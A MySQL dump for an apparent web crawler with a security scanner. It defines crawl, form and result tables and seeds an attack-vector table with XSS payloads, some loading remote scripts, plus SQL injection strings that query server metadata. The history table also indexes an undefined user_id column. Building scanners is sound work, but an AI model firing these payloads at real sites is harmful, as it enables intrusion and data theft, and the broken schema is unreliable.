/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

# the crawl index
DROP TABLE IF EXISTS `crawl_index`;
CREATE TABLE `crawl_index` (
  `id` int(11) unsigned NOT NULL auto_increment,
  `user_id` int(11) unsigned NOT NULL,
  `link` varchar(255) NOT NULL,
  `count` int(11) unsigned default '1',
  `contenthash` varchar(32) default NULL,
  PRIMARY KEY  (`id`),
  INDEX `user_idx` (`user_id`),
  INDEX `link_idx` (`link`),
  UNIQUE KEY `user_link_uniq_idx` (`user_id`, `link`)
) ENGINE=MyISAM DEFAULT AUTO_INCREMENT=1 CHARSET=utf8;

# a backup of the previous ran crawl
DROP TABLE IF EXISTS `history_crawl_index`;
CREATE TABLE `history_crawl_index` (
  `id` int(11) unsigned NOT NULL auto_increment,
  `link` varchar(255) NOT NULL,
  `count` int(11) unsigned default '1',
  `contenthash` varchar(32) default NULL,
  PRIMARY KEY  (`id`),
  INDEX `user_idx` (`user_id`),
  INDEX `link_idx` (`link`),
  UNIQUE KEY `user_link_uniq_idx` (`user_id`, `link`)
) ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

# the security crawler stored page forms
DROP TABLE IF EXISTS `crawl_security_form`;
CREATE TABLE `crawl_security_form` (
  `id` int(11) unsigned NOT NULL auto_increment,
  `page_id` int(11) unsigned NOT NULL,
  `action` varchar(255) NOT NULL,
  `method` varchar(4) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

# the security crawler results
DROP TABLE IF EXISTS `crawl_security_results`;
CREATE TABLE `crawl_security_results` (
  `id` int(11) unsigned NOT NULL auto_increment,
  `form_id` int(11) unsigned NOT NULL,
  `vector_id` int(11) unsigned NOT NULL,
  `results` text,
  PRIMARY KEY  (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

# the security crawler attack vectors
DROP TABLE IF EXISTS `crawl_security_vectors`;
CREATE TABLE `crawl_security_vectors` (
  `id` int(11) unsigned NOT NULL auto_increment,
  `name` varchar(100) default NULL,
  `type` varchar(12) NOT NULL,
  `code` varchar(400) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=1 DEFAULT CHARSET=utf8;

LOCK TABLES `crawl_security_vectors` WRITE;
/*!40000 ALTER TABLE `crawl_security_vectors` DISABLE KEYS */;
INSERT INTO `crawl_security_vectors` VALUES
(1,'','XSS','<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://in.secure.com/xss.js\"></SCRIPT>'),
(2,'','XSS','<SCRIPT a=\">\'>\" SRC=\"http://in.secure.com/xss.js\"></SCRIPT>'),
(3,'','XSS','<SCRIPT a=\">\'>\" SRC=\"http://in.secure.com/xss.js\"></SCRIPT>'),
(4,'','XSS','<SCRIPT \"a=\'>\'\" SRC=\"http://in.secure.com/xss.js\"></SCRIPT>'),
(5,'','XSS','<? echo(\"<SCR)\";echo(\"IPT>alert(\'XSS\')</SCRIPT>\"); ?>'),
(6,'Inline Style Expression 1','XSS','<XSS STYLE=\"xss:expression(alert(\'XSS\'))\">'),
(7,'Inline Style Expression 2','XSS','<IMG STYLE=\"xss:expr/*XSS*/ession(alert(\'XSS\'))\">'),
(8,'Inline Style Expression 3','XSS','<DIV STYLE=\"width: expression(alert(\'XSS\'));\">'),
(9,'Style Import','XSS','<STYLE>@import\'\\ja\\vasc\\ript:alert(\"XSS\")\';</STYLE>'),
(10,'Background Image 1','XSS','<DIV STYLE=\"background-image: url(&#1;javascript:alert(\'XSS\'))\">'),
(11,'Background Image 2','XSS','<DIV STYLE=\"background-image: url(javascript:alert(\'XSS\'))\">'),
(12,'Stylesheet Link','XSS','<LINK REL=\"stylesheet\" HREF=\"javascript:alert(\'XSS\');\">'),
(13,'Body Onload','XSS','<BODY ONLOAD=alert(\'XSS\')>'),
(14,'Escape Escaped Characters','XSS','\";alert(\'XSS\');//'),
(15,'No Quote Alert','XSS','<SCRIPT>alert(/XSS/.source)</SCRIPT>'),
(16,'XSS Locator','XSS','\';alert(String.fromCharCode(88,83,83))//\\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode(88,83,83))//--></SCRIPT>\">\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>'),
(17,'XSS Easy Test','XSS','<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>'),
(18,'Malformed Image Tag','XSS','<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">'),
(19,'OR Test','SQL INJECTIO','\' OR 1=1'),
(20,'Show Tables','SQL INJECTIO','\' OR 1=1; SHOW TABLES;'),
(21,'Select Version','SQL INJECTIO','\' OR 1=1; SELECT VERSION();'),
(22,'Select Host,User,Db','SQL INJECTIO','\' OR 1=1; select host,user,db from mysql.db;');
/*!40000 ALTER TABLE `crawl_security_vectors` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;